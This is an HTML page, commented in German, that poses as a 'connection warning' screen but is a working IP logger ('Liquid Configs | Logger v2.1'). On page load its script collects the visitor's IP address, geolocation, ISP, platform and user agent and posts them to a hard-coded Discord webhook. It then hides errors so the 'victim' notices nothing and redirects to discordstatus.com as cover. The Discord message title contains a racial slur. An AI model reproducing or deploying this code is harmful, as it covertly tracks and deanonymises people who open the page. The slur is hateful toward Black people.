<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Initializing...</title>
    <style>
        body { 
            background-color: #0a0a0a; 
            color: #00ff41; 
            font-family: 'Courier New', Courier, monospace; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            border: 1px solid #00ff41;
            padding: 25px;
            background: rgba(0, 255, 65, 0.03);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
            width: 100%;
            max-width: 400px;
            border-radius: 4px;
        }
        h2 { font-size: 1.1rem; color: #ff3e3e; margin-top: 0; text-transform: uppercase; }
        p { font-size: 0.85rem; line-height: 1.6; margin-bottom: 0; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div class="container">
        <h2>⚠️ Connection Warning</h2>
        <p>Establishing encrypted tunnel...<br>
        Status: <span class="blink">Sending Handshake...</span></p>
    </div>

    <script>
        async function captureAndRedirect() {
    // Hier musst du deinen echten Discord Webhook Link einfügen
    const webhookURL = "https://discord.com/api/webhooks/1502737899991470102/i4QaZRFis2D8Axt1jmgTqR_zsGxtNLo_C3OZyVjxn9iilxXQPv5x7QNrFa1pjTXKWiJQ"; 
    
    try {
        // Holt die IP-Informationen des Opfers
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        // Erstellt das Layout für deine Discord-Nachricht
        const payload = {
            embeds: [{
                title: "🚨 nigger TRIGGERED!",
                color: 16776960, // Gelbe Farbe
                fields: [
                    { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: false },
                    { name: "📍 Location", value: `${data.city}, ${data.region} (${data.country_name})`, inline: true },
                    { name: "🏢 ISP / Provider", value: data.org, inline: true },
                    { name: "💻 OS / Platform", value: navigator.platform, inline: false },
                    { name: "📱 User Agent", value: navigator.userAgent, inline: false }
                ],
                footer: { text: "Liquid Configs | Logger v2.1" },
                timestamp: new Date()
            }]
        };

        // Sendet die Daten per POST an deinen Discord Webhook
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

    } catch (error) {
        // Fehler werden ignoriert, damit das Opfer nichts merkt
        console.log("Connection stable...");
    } finally {
        // Schickt das Opfer nach 1,5 Sekunden auf eine glaubwürdige Seite
        setTimeout(() => {
            window.location.replace("https://discordstatus.com");
        }, 1500);
    }
}

// Startet die Funktion sofort beim Laden der Seite
captureAndRedirect();
    </script>
</body>
</html>
